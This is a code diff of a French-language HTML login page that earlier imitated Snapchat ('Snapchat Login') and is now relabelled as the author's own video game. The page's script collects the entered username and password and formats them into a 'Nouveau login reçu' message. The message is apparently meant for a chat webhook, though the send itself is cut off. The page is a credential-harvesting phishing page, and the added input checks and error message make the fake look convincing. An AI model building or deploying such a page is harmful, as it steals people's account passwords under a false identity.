@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat Login</title>
+  <title>Mon jeux video</title>
   <style>
     body {
       margin: 0; padding: 0;
@@ -38,16 +38,23 @@
     button:hover {
       background-color: #e6e600;
     }
+    #errorMessage {
+      color: red;
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>Se connecter à Snapchat</h2>
+    <h2>Se connectez au jeux video crée par moi</h2>
     <form id="loginForm">
       <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
       <input type="password" id="password" placeholder="Mot de passe" required />
       <button type="submit">Connexion</button>
     </form>
+    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
   </div>
 
   <script>
@@ -56,8 +63,21 @@
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const errorMessage = document.getElementById('errorMessage');
+
+      if (
+        username.length < 3 ||
+        password.length < 3 ||
+        username.includes(" ") ||
+        password.includes(" ")
+      ) {
+        errorMessage.style.display = 'block';
+        return;
+      } else {
+        errorMessage.style.display = 'none';
+      }
 
       const message = {
         content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
